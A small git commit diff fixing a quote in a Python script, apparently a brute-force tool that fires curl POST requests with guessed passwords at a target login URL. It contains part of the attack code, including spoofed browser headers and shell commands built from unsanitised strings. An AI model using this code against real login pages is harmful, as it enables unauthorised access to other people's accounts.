7a4e0765fffe4c8e11166642b31e895a23435c35
Rob Saffell <48562680+Xenon-Manta@users.noreply.github.com>
2019-05-11 21:49:52 -0500

    Update brute_curl_login.py

--- brute_curl_login.py
+++ brute_curl_login.py
@@ -9,7 +9,7 @@ def main():
     os.system("echo '' > result.txt")
     
     with open(filePath) as f:
-        cmd = "curl '" + urlTarget + "' -H 'Host: '" + urlTarget + "' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: " + urlTarget + "' -H 'Cookie: _ga=GA1.2.241655946.1557596937; _gid=GA1.2.198210207.1557596937' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data 'password="
+        cmd = "curl '" + urlTarget + "' -H 'Host: " + urlTarget + "' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: " + urlTarget + "' -H 'Cookie: _ga=GA1.2.241655946.1557596937; _gid=GA1.2.198210207.1557596937' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data 'password="
 
         while True:
             try:
